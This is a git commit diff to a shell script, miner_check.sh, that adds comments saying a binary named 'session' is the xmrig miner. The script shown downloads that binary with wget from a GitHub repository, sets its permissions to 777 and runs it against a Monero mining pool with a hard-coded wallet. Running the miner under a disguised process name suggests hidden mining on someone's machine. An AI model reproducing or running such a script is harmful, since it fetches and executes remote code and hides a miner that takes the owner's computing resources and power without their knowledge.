de5b1fc8032017692788bbc55ff58b947bf2c25c
hlr0 <160110248+hlr0@users.noreply.github.com>
2025-03-25 08:53:45 +0200

    Update miner_check.sh

--- miner_check.sh
+++ miner_check.sh
@@ -24,9 +24,11 @@ if pgrep -x "session" > /dev/null; then
 elif [ -f "./session" ]; then
     echo "Session file found. Starting..."
     chmod 777 session
+    #session is xmrig
     ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025
 else
     echo "Session file not found. Downloading and starting..."
+    #session is xmrig
     wget https://github.com/charlene-roperos/miner/raw/refs/heads/main/session
     chmod 777 session
     ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025
